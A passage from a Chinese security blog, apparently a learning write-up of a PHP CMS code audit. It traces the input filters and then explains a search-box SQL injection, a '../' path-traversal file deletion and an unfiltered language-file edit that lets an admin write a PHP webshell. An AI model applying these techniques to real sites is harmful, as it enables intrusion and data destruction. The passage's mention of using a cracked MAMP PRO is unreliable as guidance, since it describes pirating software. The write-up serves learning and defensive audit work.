&#39;register&#39;</span><br></pre></td></tr></table></figure><p>全局定位到获取用户iP的代码部分：</p><p>phpstorm 搜索 获取IP，即可。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取客户端IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，当ip 除去<code>.</code>  后，如果不是纯数字，那么就设置为 0.0.0.0 。因此通过伪造IP进行注入是行不通了。</p><h2 id="XSS-过滤"><a href="#XSS-过滤" class="headerlink" title="XSS 过滤"></a>XSS 过滤</h2><p>前台存在留言功能。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>提交后，我们登录后台管理员进行查看留言内容。 发现并没有执行js代码。</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;您的网站有了新的留言&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的输入是被传入了<code>post</code> 函数进行执行，跟进该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过了<code>strict</code> 条件的过滤函数，找到这个的定义处。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//严格过滤字符串中的危险符号</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到html 的闭合标签被转义了，所以没法XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF 修改用户密码，需要旧密码，行不通。</p><h2 id="可控变量过滤"><a href="#可控变量过滤" class="headerlink" title="可控变量过滤"></a>可控变量过滤</h2><h3 id="session-过滤"><a href="#session-过滤" class="headerlink" title="session 过滤"></a>session 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-过滤"><a href="#cookie-过滤" class="headerlink" title="cookie 过滤"></a>cookie 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-登录"><a href="#admin-登录" class="headerlink" title="admin 登录"></a>admin 登录</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;对不起，用户名和密码不能为空&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;返回重新登录&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     ……</span><br></pre></td></tr></table></figure><h3 id="user-登录"><a href="#user-登录" class="headerlink" title="user 登录"></a>user 登录</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以看到，基本都经过了带有过滤的函数处理。所以像，SQL注入和XSS 这种需要构造特殊符号的漏洞几乎很难了</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>基于功能点去测，先高危后低危。后台一般防御较弱，从后台突破较容易。而后台存在的功能有：图片、文件、模板管理、删除、留言审核，等其他功能。</p><h2 id="前台搜索框SQL-注入"><a href="#前台搜索框SQL-注入" class="headerlink" title="前台搜索框SQL 注入"></a>前台搜索框SQL 注入</h2><p>开启MySQL 监控，然后再搜索框进行搜索。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>如图，123，被带入SQL语句进行查询，单引号闭合。将关键字在整个文件夹中搜索：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>这里先rawurldecode 解码，然后带入拼接进入查询。</p><p>然后下断点进行分析：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>直接上sqlmap。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="后台任意文件删除漏洞"><a href="#后台任意文件删除漏洞" class="headerlink" title="后台任意文件删除漏洞"></a>后台任意文件删除漏洞</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>此处采用了白名单的形式，只能删除 指定的三个目录下的文件。但是忽略了可以用<code>../</code>来绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr 从第<code>$path</code>的第一个字母开始往后判断，截取path前半部分长度和白名单是否相等，即是否是白名单里的那几个目录，是，然后<code>unlink</code>删除掉。</p><p>成功删除文件时，返回1。</p><p>这里我遇到了一个问题，就是这个域名是通过MAMP修改的本地HOSTS文件解析的，然后找到了一篇文章，<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0，简单设置一下就可以了。</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="漏洞演示"></p><h2 id="后台编辑语言文件设置GetShell"><a href="#后台编辑语言文件设置GetShell" class="headerlink" title="后台编辑语言文件设置GetShell"></a>后台编辑语言文件设置GetShell</h2><p>成功编辑后，回显 编辑语言包成功。那么在整个文件中搜索即可定位到代码。<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;编辑语言包成功&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;返回上一页&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该函数中，经过<code>post()</code> 函数过滤，但是对于<code>$lang_text</code> 的过滤规则是<code>no_filter</code> ，跟进查看一下该规则。</p><p>/include/function.php,104行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// 删除反斜杠</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有过滤 <code>$lang_text</code> 就通过<code>file_put_contents</code> 写入文件，那么这里就可以写WebShell。</p><p>同样的，下断点来调试分析。</p><p>step into ，慢慢点，可以看到这里没有任何过滤，写入webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> 可控的，这里只需要把<code>$path</code> 改为一个<code>.php</code> 后缀的就可以GetShell 了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="审计总结"><a href="#审计总结" class="headerlink" title="审计总结"></a>审计总结</h1><p>基本上是照搬照抄别人的思路来搞的，总比躺着玩手机强，也遇到了一些问题，比如Burp Suite 设置 域名和ip 绑定，phpstorm 调试分析，总之，能学到东西就行。学到了思路，下一步就是复现thinkphp 的历史漏洞，和thinkcmf 或者其他php框架的历史漏洞，学习完之后就去找cms进行实战！（其实这个已经搁置了快半年了。</p><blockquote><p>一个不能孜孜不倦，始终处于新知识、新技术学习状态下的安全爱好者，必然会被超越和取代。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;代码审计常见的三种方法（PHP篇）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="漏洞挖掘" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 下配置PHP代码审计环境，PHP调试学习</title>
    <link href="https://hack-for.fun/4fd81e40.html"/>
    <id>https://hack-for.fun/4fd81e40.html</id>
    <published>2020-09-11T12:34:13.000Z</published>
    <updated>2020-09-11T15:56:23.844Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境配置参考文章：<a href="https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2">https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2</a></p><blockquote><p>所需App：</p><p>MAMP PRO ，我是在Google 里找的Cracked Version</p><p>PHPStorm / Vscode</p></blockquote><p>MAMP 中的 <code>php.ini</code> 设置</p><p>在切换php版本时需添加如下内容，免得debug 环境出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable&#x3D;1</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_autostart&#x3D;1</span><br><span class="line">xdebug.profiler_enable&#x3D;0</span><br><span 